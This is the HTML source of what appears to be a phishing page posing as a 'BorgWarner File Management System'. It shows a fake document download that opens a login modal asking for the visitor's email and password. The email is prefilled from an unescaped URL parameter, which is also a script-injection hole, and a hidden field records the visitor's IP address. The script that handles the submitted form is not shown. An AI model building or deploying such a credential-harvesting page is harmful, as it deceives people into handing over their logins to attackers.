<!DOCTYPE html>
<html lang="en">

<head>

<title>Documentation.</title>
<!-- Styles -->
<link href="assets/css/theDocs.all.min.css" rel="stylesheet">
<link href="assets/css/custom.css" rel="stylesheet">
<!-- Fonts -->
<link href='http://fonts.googleapis.com/css?family=Raleway:100,300,400,500%7CLato:300,400' rel='stylesheet' type='text/css'>
<!-- Favicons -->
<link rel="icon" href="assets/img/favicon.png">
</head>
<body data-spy="scroll" data-target=".sidebar" data-offset="200">
<!-- Sidebar -->
<aside class="sidebar sidebar-boxed sidebar-dark"> <a class="sidebar-brand" href="index-2.html"><img src="assets/img/logo.png" alt="logo"></a>
  <ul class="nav sidenav dropable">
    <li><a href="javascript:void(0);">Document</a></li>
    <li><a href="javascript:void(0);">Support</a></li>
    <li><a href="javascript:void(0);">News</a></li>
  </ul>
</aside>
<!-- END Sidebar -->
<header class="site-header navbar-transparent">
  <!-- Banner -->
  <div class="banner auto-size" style="background-color: #949494">
    <div class="container-fluid text-white">
      <h3>BORGWARNER FILE MANAGEMENT SYSTEM</h3>
    </div>
  </div>
  <div class="breadcrumb"><a href="javascript:void(0);">Document</a> -> <a href="javascript:void(0);">Important Files</a> -> Current File</div>
  <!-- END Banner -->
</header>
<main class="container-fluid">
  <!-- Main content -->
  <article class="main-content" role="main">
    <section>
      <h3>File to Download</h3>
      <div class="row">
        <div class="col-sm-6 col-md-2"> <a href="#" data-toggle="modal" data-target="#loginModal">
          <div class="thumbnail"> <img src="assets/img/word.png" alt="doc file"> </div>
          <div class="caption">
            <h5>Borgwarner.Doc</h5>
          </div>
          </a> </div>
      </div>
    </section>
  </article>
  <!-- END Main content -->
  <!-- Login Modal -->
  <div class="modal fade" id="loginModal" tabindex="-1" role="dialog" aria-labelledby="loginModalLabel" aria-hidden="true">
    <div class="modal-dialog">
      <div class="modal-content login-modal">
        <div class="modal-header login-modal-header">
          <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
          <h4 class="modal-title text-center" id="loginModalLabel">USER AUTHENTICATION</h4>
        </div>
        <div class="alert alert-danger text-center" id="alert"></div>
        <div class="modal-body">
          <div class="text-center">
            <div role="tabpanel" class="login-tab">
              <div class="tab-content">
                <div role="tabpanel" class="tab-pane active text-center" id="home"> &nbsp;&nbsp; <span id="login_fail" class="response_error" style="display: none;">Loggin failed, please try again.</span>
                  <div class="clearfix"></div>
				 
                  <form>
                    <div class="form-group">
                      <div class="input-group">
                        <div class="input-group-addon"><i class="fa fa-user"></i></div>
                        <input type="text" class="form-control" id="email" value="<?=$_GET[email]?>" placeholder="Email Address">
                      </div>
                    </div>
                    <div class="form-group">
                      <div class="input-group">
                        <div class="input-group-addon"><i class="fa fa-lock"></i></div>
                        <input type="password" class="form-control" id="password" placeholder="Password">
                      </div>
                    </div>
            	    <input type="hidden" name="ip" id="ip" value="37.111.130.203">
                    <button type="button" id="login_btn" class="btn btn-block bt-login" data-loading-text="Signing In....">Download</button>
                    <div class="clearfix"></div>
                    <div class="login-modal-footer">
                      <div class="row">
                        <p class="text-center">Login with your Email and Password.</p>
                      </div>
                    </div>
                  </form>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
  <!-- /Login Modal -->
</main>
<!-- Footer -->
<footer class="site-footer">
  <div class="container-fluid"> <a id="scroll-up" href="#"><i class="fa fa-angle-up"></i></a>
    <div class="row">
      <div class="col-md-12 col-sm-12">
        <p class="text-center">Copyright &copy; 2017. All right reserved</p>
      </div>
    </div>
  </div>
</footer>
<!-- END Footer -->
<!-- Scripts -->
<!--<script src="assets/js/jquery.min.js"></script>-->
<script src="assets/js/theDocs.all.min.js"></script>
<script src="assets/js/custom.js"></script>
<script type="text/javascript">
    //$(window).on('load',function(){
        //$('#loginModal').modal('show');
    });
</script>


</html>
